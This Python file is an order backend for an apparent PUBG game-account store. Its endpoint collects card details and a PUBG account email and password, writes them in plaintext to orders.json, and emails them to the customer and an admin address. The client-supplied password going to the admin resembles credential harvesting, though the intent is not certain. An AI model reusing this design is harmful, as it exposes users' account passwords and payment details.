import json
import os
import smtplib
from email.message import EmailMessage
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PORT = 8000
SMTP_HOST = os.getenv("SMTP_HOST", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
SMTP_EMAIL = os.getenv("SMTP_EMAIL", "")
SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "")
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL", "")


class GameVaultHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=BASE_DIR, **kwargs)

    def do_POST(self):
        parsed = urlparse(self.path)

        if parsed.path == "/api/order":
            length = int(self.headers.get("Content-Length", "0"))
            raw_data = self.rfile.read(length).decode("utf-8", errors="ignore")

            try:
                payload = json.loads(raw_data or "{}")
            except json.JSONDecodeError:
                payload = {}

            order = {
                "customerEmail": payload.get("customerEmail", ""),
                "productName": payload.get("productName", ""),
                "productType": payload.get("productType", ""),
                "productPrice": payload.get("productPrice", ""),
                "cardLast4": payload.get("cardLast4", ""),
                "cardExpiry": payload.get("cardExpiry", ""),
                "cardHolder": payload.get("cardHolder", ""),
                "accountEmail": payload.get("accountEmail", ""),
                "accountPassword": payload.get("accountPassword", ""),
                "createdAt": payload.get("createdAt")
            }

            self.save_order(order)

            try:
                self.send_order_email(order)
            except Exception as exc:
                print(f"[EMAIL] فشل في الإرسال: {exc}")

            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "ok",
                "message": "تم استلام الطلب بنجاح"
            }, ensure_ascii=False).encode("utf-8"))
            return

        self.send_response(404)
        self.end_headers()

    def save_order(self, order):
        file_path = os.path.join(BASE_DIR, "orders.json")
        orders = []

        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    orders = json.load(file)
            except Exception:
                orders = []

        if not isinstance(orders, list):
            orders = []

        orders.append(order)

        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(orders, file, ensure_ascii=False, indent=2)

    def send_order_email(self, order):
        if not SMTP_EMAIL or not SMTP_PASSWORD:
            print("[EMAIL] لم يتم تفعيل SMTP. أضف SMTP_EMAIL و SMTP_PASSWORD في متغيرات البيئة.")
            return

        customer_email = order.get("customerEmail", "")
        product_name = order.get("productName", "")
        product_type = order.get("productType", "")
        product_price = order.get("productPrice", "")
        card_last4 = order.get("cardLast4", "")
        card_expiry = order.get("cardExpiry", "")
        card_holder = order.get("cardHolder", "")
        account_email = order.get("accountEmail", "")
        account_password = order.get("accountPassword", "")

        message = EmailMessage()
        message["Subject"] = "تأكيد شراء PUBG Market"
        message["From"] = SMTP_EMAIL
        message["To"] = customer_email or SMTP_EMAIL

        body = (
            "تمت معالجة طلبك بنجاح.\n\n"
            f"اسم العميل: {card_holder}\n"
            f"البريد الإلكتروني: {customer_email}\n"
            f"المنتج: {product_name}\n"
            f"النوع: {product_type}\n"
            f"السعر: {product_price}\n"
            f"رقم البطاقة: **** **** **** {card_last4}\n"
            f"تاريخ الانتهاء: {card_expiry}\n\n"
            "بيانات حساب PUBG:\n"
            f"إيميل الحساب: {account_email}\n"
            f"كلمة السر: {account_password}\n\n"
            "تم تجهيز الحساب وسيتم تسليمه عبر هذا البريد الإلكتروني."
        )
        message.set_content(body, subtype="plain", charset="utf-8")

        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_EMAIL, SMTP_PASSWORD)
            server.send_message(message)

        if ADMIN_EMAIL:
            admin_message = EmailMessage()
            admin_message["Subject"] = "طلب جديد من متجر PUBG"
            admin_message["From"] = SMTP_EMAIL
            admin_message["To"] = ADMIN_EMAIL
            admin_message.set_content(body, subtype="plain", charset="utf-8")
            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_EMAIL, SMTP_PASSWORD)
                server.send_message(admin_message)

    def log_message(self, format, *args):
        return


if __name__ == "__main__":
    try:
        server = ThreadingHTTPServer(("0.0.0.0", PORT), GameVaultHandler)
        print(f"[SERVER] تم تشغيل السيرفر على http://localhost:{PORT}")
        print("[INFO] استخدم: python game.py")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[SERVER] تم إيقاف السيرفر.")
